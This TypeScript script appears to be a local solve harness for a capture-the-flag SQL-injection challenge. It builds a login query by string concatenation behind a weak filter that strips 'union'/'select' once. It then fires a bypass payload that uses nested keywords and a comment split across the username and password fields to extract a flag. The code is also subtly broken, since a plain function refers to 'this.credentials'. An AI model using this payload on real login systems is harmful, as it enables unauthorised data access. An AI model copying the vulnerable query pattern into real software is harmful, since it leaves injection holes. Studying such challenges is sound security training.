import pg from "pg";
import { exit } from "process";
import chalk from "chalk";

interface Credentials {
  id: number;
  username: string;
  password: string;
}

const CredentialOptions = [
  { id: 1, username: "zuck", password: "hunter2" },
  { id: 2, username: "randall", password: "correcthorsebatterystaple" },
  { id: 3, username: "richard", password: "cowabunga" },
] as const satisfies Credentials[];

const pool = new pg.Pool({
  connectionString: "postgresql://amongst:amongst@localhost:5432/postgres",
});
pool.connect();

let out = await pool.query(`SELECT flag as username, 3 as id FROM flag;`);
console.log(chalk.cyan(`flag: ${JSON.stringify(out.rows, null, 4)}`));

async function run(username: string, password: string) {
  // No sql injection
  // prettier-ignore
  username = username
    .replace(/'/g, "''")
    .replace(/union|select/gi, "");

  // prettier-ignore
  password = password
    .replace(/'/g, "''")
    .replace(/union|select/gi, "");

  if (username.includes("'")) {
    console.warn(chalk.yellow("Warning: Username contains single quotes\n"));
  }

  if (password.includes("'")) {
    console.warn(chalk.yellow("Warning: Password contains single quotes\n"));
  }

  if (username.length >= 48) {
    console.warn(chalk.yellow("Warning: Username will be truncated\n"));
  }

  if (password.length >= 48) {
    console.warn(chalk.yellow("Warning: Password will be truncated\n"));
  }

  // Max length of username and password is 48
  username = username.substring(0, 48);
  password = password.substring(0, 48);

  console.log(
    chalk.blue(
      `Attempting to provide credentials for ${JSON.stringify(
        { username, password },
        null,
        4
      )}`
    )
  );

  let query = `SELECT id, username FROM users WHERE username = '${username}' AND password = '${password}'`;

  console.log(chalk.cyan(`Query: ${query}`));

  await pool
    .query<{ id: number; username: string }>(query)
    .then((result) => {
      console.log(
        chalk.green(
          `Query result ${result.rowCount}: ${JSON.stringify(
            result.rows,
            null,
            4
          )}`
        )
      );

      if (result.rowCount !== 1) {
        console.log(
          chalk.yellow(
            `Invalid credentials, row count: ${JSON.stringify(result.rows)}`
          )
        );
        throw new Error("Invalid credentials");
      }

      if (result.rows[0].id !== this.credentials.id) {
        console.log(
          chalk.red(
            `User ID mismatch: ${result.rows[0].id} !== ${this.credentials.id}`
          )
        );
        throw new Error("Invalid credentials");
      }

      console.log(
        chalk.green(
          `Credentials provided successfully: ${JSON.stringify(result.rows[0])}`
        )
      );
    })
    .catch((err) => {
      console.error(chalk.red(err));
      console.error(
        chalk.red(`Error providing credentials: ${JSON.stringify(err)}`)
      );
    });
}

// Our best effort as of 2025-08-30 20:50 ET
let username = `' UNIUNIONON SELSELECTECT 3 as id /*`;
let password = "*/, flag as username FROM flag--";

await run(username, password);

exit();
